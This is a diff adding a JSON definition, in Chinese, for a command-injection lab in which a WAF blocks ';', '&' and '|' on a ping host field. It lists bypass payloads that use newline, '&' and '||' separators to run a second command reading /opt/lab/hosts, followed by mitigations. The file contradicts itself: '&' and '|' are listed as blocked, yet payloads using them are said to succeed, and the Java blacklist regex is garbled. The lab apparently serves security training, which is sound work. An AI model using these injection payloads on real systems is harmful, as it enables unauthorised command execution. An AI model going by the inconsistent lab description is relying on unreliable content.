@@ -1,0 +1,99 @@
+{
+  "context": "rce_ping_a2",
+  "title": "命令注入 · A2（拦截 ; && |）",
+  "goal": "绕过 WAF 拦截，使用其他分隔符（换行、后台、逻辑或）执行第二条命令",
+  "vuln": {
+    "summary": "VULN：WAF 拦截分号、逻辑与、管道符，但未拦截其他分隔符",
+    "impact": [
+      "任意命令执行：攻击者可以绕过 WAF 执行任意系统命令",
+      "WAF 绕过：通过其他分隔符绕过黑名单过滤"
+    ],
+    "waf": {
+      "blocked_chars": [";", "&", "|"],
+      "description": "WAF 拦截分号、逻辑与、管道符"
+    }
+  },
+  "exploit": {
+    "steps": [
+      {
+        "step": 1,
+        "title": "测试 WAF 拦截",
+        "description": "尝试使用被拦截的分隔符，确认 WAF 生效",
+        "payload": "127.0.0.1; whoami",
+        "expected": "WAF 拦截提示"
+      },
+      {
+        "step": 2,
+        "title": "使用换行符绕过",
+        "description": "使用 URL 编码的换行符（%0a）分隔命令",
+        "payload": "127.0.0.1%0acat /opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      },
+      {
+        "step": 3,
+        "title": "使用后台执行绕过",
+        "description": "使用后台执行符（&）分隔命令",
+        "payload": "127.0.0.1& cat /opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      },
+      {
+        "step": 4,
+        "title": "使用逻辑或绕过",
+        "description": "使用逻辑或（||）分隔命令，第一条失败后执行第二条",
+        "payload": "127.0.0.1 || cat /opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      }
+    ],
+    "payloads": {
+      "newline": [
+        "127.0.0.1%0acat /opt/lab/hosts",
+        "127.0.0.1%0dcat /opt/lab/hosts",
+        "127.0.0.1%0a%0dcat /opt/lab/hosts"
+      ],
+      "background": [
+        "127.0.0.1& cat /opt/lab/hosts",
+        "127.0.0.1 & cat /opt/lab/hosts"
+      ],
+      "logical_or": [
+        "127.0.0.1 || cat /opt/lab/hosts",
+        "127.0.0.1||cat /opt/lab/hosts"
+      ]
+    }
+  },
+  "mitigation": {
+    "title": "修复建议",
+    "approaches": [
+      {
+        "name": "完善黑名单",
+        "description": "添加更多分隔符到黑名单（&、||、%0a、%0d）",
+        "code": {
+          "language": "java",
+          "snippet": "String blocked = \"[;&|&|\\r\\n]\";\nif (Pattern.compile(blocked).matcher(input).find()) {\n    throw new SecurityException(\"WAF blocked\");\n}"
+        }
+      },
+      {
+        "name": "白名单验证",
+        "description": "只允许 IP 地址格式，拒绝其他所有输入",
+        "code": {
+          "language": "java",
+          "snippet": "if (!host.matches(\"^[0-9.]+$\")) {\n    throw new IllegalArgumentException(\"Invalid host\");\n}"
+        }
+      },
+      {
+        "name": "参数化执行",
+        "description": "使用 ProcessBuilder 参数数组，避免 shell 解析"
+      }
+    ]
+  },
+  "tips": [
+    "换行符（%0a）可以在 URL 中使用，服务器会解码为换行",
+    "后台执行符（&）会立即执行第二条命令，不等待第一条完成",
+    "逻辑或（||）在第一条命令失败时执行第二条",
+    "WAF 黑名单容易遗漏，建议使用白名单验证"
+  ],
+  "common_mistakes": [
+    "使用了被拦截的分隔符（; && |）",
+    "忘记对换行符进行 URL 编码",
+    "混淆了后台执行符（&）和逻辑与（&&）"
+  ]
+}
